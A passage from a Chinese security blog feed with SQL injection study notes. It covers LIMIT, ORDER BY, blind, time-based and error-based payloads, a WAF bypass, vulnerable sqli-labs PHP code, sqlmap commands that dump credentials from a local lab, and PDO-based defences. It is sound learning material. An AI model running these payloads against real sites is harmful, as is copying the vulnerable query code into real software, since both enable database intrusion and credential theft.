class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class=\"line\">/* execute multi query */</span><br><span class=\"line\">if (mysqli_multi_query($con1, $sql))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    /* store first result set */</span><br><span class=\"line\">    if ($result = mysqli_store_result($con1))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if($row = mysqli_fetch_row($result))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;\t</span><br><span class=\"line\">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">//            mysqli_free_result($result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        /* print divider */</span><br><span class=\"line\">    if (mysqli_more_results($con1))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">            //printf(&quot;-----------------\\n&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     //while (mysqli_next_result($con1));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\techo &#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class=\"line\">\tprint_r(mysqli_error($con1));</span><br><span class=\"line\">\techo &quot;&lt;/font&gt;&quot;;  </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">/* close connection */</span><br><span class=\"line\">mysqli_close($con1);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>堆叠注入部分参考链接：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmFja2xpb24vcC85NzIxNjg3Lmh0bWw=\">https://www.cnblogs.com/backlion/p/9721687.html</span></p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220321165558549.png\" alt=\"image-20220321165558549\" style=\"zoom:67%;\" />\n<h5 id=\"update-insert语句中注入\"><a class=\"markdownIt-Anchor\" href=\"#update-insert语句中注入\">#</a> update /insert 语句中注入</h5>\n<p>sqllab pass-17</p>\n<p>数据外带</p>\n<p>floor 报错注入</p>\n<p><strong>注意：update 语句中使用 updatexml 和 extractvalue 报错注入时 update 不会执行，因为 xpath 报错导致程序退出</strong></p>\n<h5 id=\"limit中注入\"><a class=\"markdownIt-Anchor\" href=\"#limit中注入\">#</a> limit 中注入</h5>\n<p>只适用于 mysql 版本 &lt; 5.5</p>\n<p>使用存储过程</p>\n<p>为什么要用存储过程？<br>\n①将重复性很高的一些操作，封装到一个存储过程中，简化了对这些 SQL 的调用</p>\n<p>②批量处理：SQL + 循环，减少流量</p>\n<p>③统一接口，确保数据的安全</p>\n<p>使用存储过程：</p>\n<p>procedure analyse (1,2) 报错在第一个参数上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>\n<p>时间盲注时但存储过程无法使用 sleep，无法盲注，使用 benchmark 代替 sleep</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)</span><br></pre></td></tr></table></figure>\n<h5 id=\"order-by注入\"><a class=\"markdownIt-Anchor\" href=\"#order-by注入\">#</a> order by 注入</h5>\n<p>order by 是 mysql 中对查询数据进行排序的方法， 使用示例</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> 表名 <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> 列名(或者数字) <span class=\"keyword\">asc</span>;  #升序(默认升序)</span><br><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> 表名 <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> 列名(或者数字) <span class=\"keyword\">desc</span>;  #降序</span><br></pre></td></tr></table></figure>\n<p>这里的重点在于 order by 后既可以填列名或者是一个数字。举个例子： id 是 user 表的第一列的列名，那么如果想根据 id 来排序，有两种写法:</p>\n<p>因此这也就是我们为什么通过 order by 判断列数，我们会把第 x 当做 order by 的条件，如果没有 x 则报错</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> id;</span><br><span class=\"line\">selecr <span class=\"operator\">*</span> <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>基于 if 盲注：</p>\n<p>需要知道列名</p>\n<p>order by 的列不同，返回的页面当然也是不同的，所以就可以根据排序的列不同来盲注。</p>\n<p>这里如果使用数字代替列名是不行的，因为 if 语句返回的是字符类型，不是整型。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by if(1=1,id,username);</span><br><span class=\"line\">order by if(表达式,1,(select id from information_schema.tables))</span><br></pre></td></tr></table></figure>\n<p>如果表达式为 false 时，sql 语句会报 ERROR 1242 (21000): Subquery returns more than 1 row 的错误，导致查询内容为空，如果表达式为 true 是，则会返回正常的页面</p>\n<p>基于时间盲注</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by if(1=1,1,sleep(1))</span><br></pre></td></tr></table></figure>\n<p>基于 rand () 盲</p>\n<p>可以看到当 rand () 为 true 和 false 时，排序结果是不同的，所以就可以使用 rand () 函数进行盲注了。 rand (true) | rand (false)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">order by rand(ascii(mid((select database()),1,1))&gt;96)</span><br></pre></td></tr></table></figure>\n<p>基于报错注入：</p>\n<p>updatexml 和 extravalue</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from ha order by updatexml(1,if(1=1,1,user()),1);#查询正常</span><br><span class=\"line\">select * from ha order by updatexml(1,if(1=2,1,user()),1);#查询报错</span><br></pre></td></tr></table></figure>\n<p>order by 注入的实例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &#x27;select * from admin where username=&#x27;&quot;.$username.&quot;&#x27;&#x27;;</span><br><span class=\"line\">$result = mysql_query($sql);</span><br><span class=\"line\">$row = mysql_fetch_array($result);</span><br><span class=\"line\">if(isset($row)&amp;&amp;row[&#x27;username&#x27;]!=&quot;admin&quot;)&#123;</span><br><span class=\"line\">\t$hit=&quot;username error!&quot;;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">\tif ($row[&#x27;password&#x27;] === $password)&#123;</span><br><span class=\"line\">\t\t$hit=&quot;&quot;;</span><br><span class=\"line\">\t&#125;else&#123;</span><br><span class=\"line\">\t\t$hit=&quot;password error!&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">             </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username=admin&#x27; union 1,2,&#x27;字符串&#x27; order by 3</span><br></pre></td></tr></table></figure>\n<p>或者一般存在的注入点为：可控制的位置在 <code>order by</code>  子句后，如下 order 参数可控</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;select * from goods order by $_GET[&#x27;order&#x27;]&quot;</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaWNlei9wL015c3FsLU9yZGVyLUJ5LUluamVjdGlvbi1TdW1tYXJ5Lmh0bWw=\">Mysql Order By 注入总结 - 艾斯泽 - 博客园 (cnblogs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjI3Nzg1L2FydGljbGUvZGV0YWlscy8xMTk0MTQwMzI=\">sql 注入之 order by 注入_夜影_321 的博客 - CSDN 博客_orderby sql 注入</span></p>\n<h3 id=\"mysql注入防御\"><a class=\"markdownIt-Anchor\" href=\"#mysql注入防御\">#</a> mysql 注入防御</h3>\n<h4 id=\"通过函数过滤\"><a class=\"markdownIt-Anchor\" href=\"#通过函数过滤\">#</a> 通过函数过滤</h4>\n<p><code>$id = addslashed($id);</code>  使用 \\ 转义字符，比如’ &quot; \\ NULL</p>\n<p>注意 GPG 开关开启时会默认转义所有输入，如果这时才使用此函数会造成双重转义使转义失效</p>\n<p><code>$id = addcslashed($id); </code>  使用 c 语言风格转义函数 \\0 \\r 等</p>\n<h4 id=\"降权\"><a class=\"markdownIt-Anchor\" href=\"#降权\">#</a> 降权</h4>\n<p>给每个数据库设置单独的管理员，不使用 root，sa 等高权限用户</p>\n<h4 id=\"使用pdo\"><a class=\"markdownIt-Anchor\" href=\"#使用pdo\">#</a> 使用 PDO</h4>\n<p>预处理语句可以把它看作是想要运行的 SQL 的一种编译过的模板，它可以使用变量参数进行定制。</p>\n<p>查询仅需解析（或预处理）一次，但可以用相同或不同的参数执行多次。当查询准备好后，数据库将分析、编译和优化执行该查询的计划。</p>\n<p>提供给预处理语句的参数不需要用引号括起来，驱动程序会自动处理。如果应用程序只使用预处理语句，可以确保不会发生 SQL 注入。</p>\n<p>预处理语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$st-&gt;bindParam(1, $id);</span><br><span class=\"line\">$st-&gt;execute();</span><br><span class=\"line\">$ret = $st-&gt;fetchAll();</span><br><span class=\"line\">print_r($ret);</span><br></pre></td></tr></table></figure>\n<p>这与我们平时使用 mysql_real_escape_string 将字符串进行转义，再拼接成 SQL 语句没有差别，只是由 PDO 本地驱动完成转义的（EMULATE_PREPARES）</p>\n<p>PDO 有一项参数，名为 PDO::ATTR_EMULATE_PREPARES ，表示是否使用 PHP 本地模拟 prepare，此项参数默认 true, 我们改为 false 后</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$pdo = new PDO(&quot;mysql:host=127.0.0.1;dbname=test;charset=utf8&quot;, &quot;root&quot;,&quot;root123&quot;);</span><br><span class=\"line\">$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);</span><br><span class=\"line\"></span><br><span class=\"line\">$st = $pdo-&gt;prepare(&quot;select * from users where id =?&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">$id = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">$st-&gt;bindParam(1, $id);</span><br><span class=\"line\">$st-&gt;execute();</span><br><span class=\"line\">$ret = $st-&gt;fetchAll();</span><br><span class=\"line\">print_r($ret);</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGVlemh4aW5nL3AvNTI4MjQzNy5odG1s\">PDO 防 sql 注入原理分析 - leezhxing - 博客园 (cnblogs.com)</span></p>\n<h3 id=\"绕过waf\"><a class=\"markdownIt-Anchor\" href=\"#绕过waf\">#</a> 绕过 waf</h3>\n<p>1. 过滤，</p>\n<p>通过 join 绕过，将查询结果当做一张表，将多张表使用 join 连接</p>\n<p>select 1,2,3 union select * from (select version()) a join  (select user()) b join  (select database()) c --+;</p>\n",
            "tags": [
                "SQL injection"
            ]
        },
        {
            "id": "http://example.com/2022/03/16/yuque/SQL%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2022/03/16/yuque/SQL%E6%B3%A8%E5%85%A5/",
            "title": "SQL injection",
            "date_published": "2022-03-16T05:38:45.000Z",
            "content_html": "<h1 id=\"sql注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h3 id=\"1sqli-labs-master-安装\"><a class=\"markdownIt-Anchor\" href=\"#1sqli-labs-master-安装\">#</a> 1.sqli-labs-master 安装</h3>\n<p>下面在 linux 中安装，虚拟机地址为 192.168.1.155，端口号为 18888，使用宝塔面板</p>\n<h4 id=\"1将sqli-labs-master移动到网站根目录下解压\"><a class=\"markdownIt-Anchor\" href=\"#1将sqli-labs-master移动到网站根目录下解压\">#</a> 1. 将 sqli-labs-master 移动到网站根目录下，解压</h4>\n<p><code>unzip sqli-labs-master</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469835321-5363494e-a8b7-4796-99a0-97f475cef370.png\" alt=\"img\"></p>\n<h4 id=\"2修改配置文件配合文件为sqlisql-connectionsdb-credsinc\"><a class=\"markdownIt-Anchor\" href=\"#2修改配置文件配合文件为sqlisql-connectionsdb-credsinc\">#</a> 2. 修改配置文件，配合文件为： <code>sqli/sql-connections/db-creds.inc</code></h4>\n<p><code>vim sqli/sql-connections/db-creds.inc</code></p>\n<p>数据库用户名和密码在宝塔面板中可以修改</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469904204-6c29948a-2cdc-4f11-8e01-58f8ed2dbe83.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469999346-dca351bf-b5d0-4a51-9ff1-dab559edf120.png\" alt=\"img\"></p>\n<h4 id=\"3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行\"><a class=\"markdownIt-Anchor\" href=\"#3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行\">#</a> 3. 浏览器打开，输入对应的文件路径，安装数据库，如果第二步有错，此步将不能正常执行</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470033800-7e58d43a-1835-4303-906c-05a0d03dd762.png\" alt=\"img\"></p>\n<h4 id=\"4验证安装完成后即可按到如下界面\"><a class=\"markdownIt-Anchor\" href=\"#4验证安装完成后即可按到如下界面\">#</a> 4. 验证安装完成后，即可按到如下界面</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470107086-065656d0-7044-4c09-9323-5e799f726534.png\" alt=\"img\"></p>\n<h3 id=\"2sqlmap-安装与使用\"><a class=\"markdownIt-Anchor\" href=\"#2sqlmap-安装与使用\">#</a> 2.sqlmap 安装与使用</h3>\n<h4 id=\"1kali联网\"><a class=\"markdownIt-Anchor\" href=\"#1kali联网\">#</a> 1.kali 联网</h4>\n<p>选择桥接时，只需要将虚拟机和物理主机 ip 置于一个网段中</p>\n<p>如果不能联网，修改 <code>/etc/network/interfaces</code>   ，设置 ip，网关，掩码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> /etc/network/interfaces.d/*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The loopback network interface**</span></span><br><span class=\"line\">auto lo</span><br><span class=\"line\">iface lo inet loopback</span><br><span class=\"line\"></span><br><span class=\"line\">auto eth0</span><br><span class=\"line\"></span><br><span class=\"line\">iface eth0 inet static</span><br><span class=\"line\">address 192.168.0.66</span><br><span class=\"line\">gateway 192.168.1.1</span><br><span class=\"line\">netmask 255.255.254.0</span><br></pre></td></tr></table></figure>\n<h4 id=\"2修改dns-etcresolvconf\"><a class=\"markdownIt-Anchor\" href=\"#2修改dns-etcresolvconf\">#</a> 2. 修改 DNS，  <code>/etc/resolv.conf</code></h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nameserver 8.8.8.8</span><br><span class=\"line\">nameserver 114.114.114.114</span><br><span class=\"line\">search localdomain</span><br></pre></td></tr></table></figure>\n<h4 id=\"3重启网络服务\"><a class=\"markdownIt-Anchor\" href=\"#3重启网络服务\">#</a> 3. 重启网络服务</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/init.d/networking restart</span><br><span class=\"line\"></span><br><span class=\"line\">service networking restart </span><br></pre></td></tr></table></figure>\n<h4 id=\"4sqlmap使用\"><a class=\"markdownIt-Anchor\" href=\"#4sqlmap使用\">#</a> 4.sqlmap 使用</h4>\n<p>下载：Github：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">https://github.com/sqlmapproject/sqlmap</span></p>\n<h4 id=\"5sqlmap支持的注入技术\"><a class=\"markdownIt-Anchor\" href=\"#5sqlmap支持的注入技术\">#</a> 5.SQLMAP 支持的注入技术</h4>\n<p>​\t基于布尔的盲注：根据返回页面判断条件真假的注入。</p>\n<p>​\t基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语 句是否执行（即页面返回时间是否增加）来判断。</p>\n<p>​\t基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>\n<p>​\t基于联合查询的注入：可以使用 UNION 的情况下的注入。</p>\n<p>​\t堆查询注入：同时执行多条语句的注入。</p>\n<h4 id=\"6sqlmap支持的数据库类型\"><a class=\"markdownIt-Anchor\" href=\"#6sqlmap支持的数据库类型\">#</a> 6.SQLMAP 支持的数据库类型</h4>\n<p>​\t主要包括一些关系型数据库（ RMDBS ） ， 如 MySQL 、Oracle 、PostgreSQL 、 Microsoft SQL Server 、Microsoft Access 、IBM DB2 、SQLite 、Firebird 、 Sybase、SAP MaxDB、Informix、HSQLDB 等</p>\n<h4 id=\"7sqlmap用法以下用windows演示\"><a class=\"markdownIt-Anchor\" href=\"#7sqlmap用法以下用windows演示\">#</a> 7.sqlmap 用法 (以下用 Windows 演示)</h4>\n<h4 id=\"71对于get请求爆破方式\"><a class=\"markdownIt-Anchor\" href=\"#71对于get请求爆破方式\">#</a> 7.1 对于 get 请求爆破方式</h4>\n<p>1.sqlmap -u URL</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span></p>\n<p>判断可注入的参数</p>\n<p>判断可以用哪种 SQL 注入技术来注入</p>\n<p>识别出所有存在的注入类型</p>\n<p>尝试去判定数据库版本、开发语言、操作系统版本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213182954882.png\" alt=\"image-20220213182954882\"></p>\n<p>2.sqlmap -u URL --current-db 获得数据库名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> --current-db</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183117274.png\" alt=\"image-20220213183117274\"></p>\n<p>3.sqlmap -u URL -D database --tables  获得数据库中表名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security --tables</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183308240.png\" alt=\"image-20220213183308240\"></p>\n<p>4.sqlmap -u URL -D database -T tables --columns 获得表中字段名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users --columns</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183454058.png\" alt=\"image-20220213183454058\"></p>\n<p>5.sqlmap -u URL -D database -T users -C name1,name2,name3 --dump 获取每个字段中的数据</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users -C password,username --dump</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183651064.png\" alt=\"image-20220213183651064\"></p>\n<h4 id=\"72对于post请求爆破方式\"><a class=\"markdownIt-Anchor\" href=\"#72对于post请求爆破方式\">#</a> 7.2 对于 post 请求爆破方式</h4>\n<p>1. 保存文件方式  sqlmap -r x.txt</p>\n<p>先使用 BurpSuite 抓包，将获取内容保存到指定文件，下面将文件保存到 E://1.txt</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -r E:\\1.txt</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183936861.png\" alt=\"image-20220213183936861\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184049162.png\" alt=\"\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184622656.png\" alt=\"image-20220213184622656\"></p>\n<p>2. 手动输入 post 参数方式  sqlmap -u URL --data “”</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=\">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --data “uname=admin&amp;passwd=admin&amp;submit=Submit” --current-db</p>\n<p>3. 自动搜索 post 参数方式</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=\">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --forms</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213185639194.png\" alt=\"image-20220213185639194\"></p>\n<h4 id=\"73对于一些较难注入的场景\"><a class=\"markdownIt-Anchor\" href=\"#73对于一些较难注入的场景\">#</a> 7.3 对于一些较难注入的场景</h4>\n<p>通过指定 level 设置，一共包含五个等级</p>\n<p>level=2 http cookie 会测试</p>\n<p>level=3 http user-agent/referer 头会测试</p>\n<p>level=5 包含的 payload 最多，会自动破解出 cookie、XFF 等头部注入，相对应他的速度也比较慢。</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> level 5</p>\n<h3 id=\"使用awvs-进行sql-inject扫描\"><a class=\"markdownIt-Anchor\" href=\"#使用awvs-进行sql-inject扫描\">#</a> 使用 AWVS 进行 sql inject 扫描</h3>\n<p>安装过程不在描述，使用 add target 输入要扫描的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305141924499.png\" alt=\"image-20220305141924499\"></p>\n<p>选择扫描速度</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142112656.png\" alt=\"image-20220305142112656\"></p>\n<p>设置 user-agent 伪装</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142142802.png\" alt=\"image-20220305142142802\"></p>\n<p>可以联动被动扫描器如 xray 进行多次扫描，</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142228843.png\" alt=\"image-20220305142228843\"></p>\n<p>选择 scan</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142305286.png\" alt=\"image-20220305142305286\"></p>\n<p>发现 sql 注入，存在盲注</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142353893.png\" alt=\"image-20220305142353893\"></p>\n<p>点击可以查看详细信息和扫描过程</p>\n<p><img 